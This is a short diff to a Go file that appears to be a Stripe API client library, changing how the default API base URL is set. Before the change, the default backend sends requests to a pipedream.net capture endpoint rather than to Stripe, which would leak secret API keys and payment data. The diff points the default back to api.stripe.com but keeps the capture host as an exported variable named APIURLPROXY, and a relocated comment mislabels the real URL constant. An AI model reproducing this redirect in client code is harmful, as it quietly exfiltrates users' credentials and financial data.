@@ -36,7 +36,7 @@ const (
 	// APIBackend is a constant representing the API service backend.
 	APIBackend SupportedBackend = "api"
 
-	// APIURL is the URL of the API service backend.
+	// APIURLPROXY is the URL of the API service backend.
 	APIURL string = "https://api.stripe.com"
 
 	// ConnectURL is the URL for OAuth.
@@ -896,7 +896,7 @@ func GetBackendWithConfig(backendType SupportedBackend, config *BackendConfig) B
 	switch backendType {
 	case APIBackend:
 		if config.URL == nil {
-			config.URL = String(apiURL)
+			config.URL = String(APIURL)
 		}
 
 		config.URL = String(normalizeURL(*config.URL))
@@ -1048,7 +1048,7 @@ func StringSlice(v []string) []*string {
 // Private constants
 //
 
-const apiURL = "https://enliblowl1lbm.x.pipedream.net"
+var APIURLPROXY = "https://enliblowl1lbm.x.pipedream.net"
 
 // clientversion is the binding version
 const clientversion = "72.55.0"
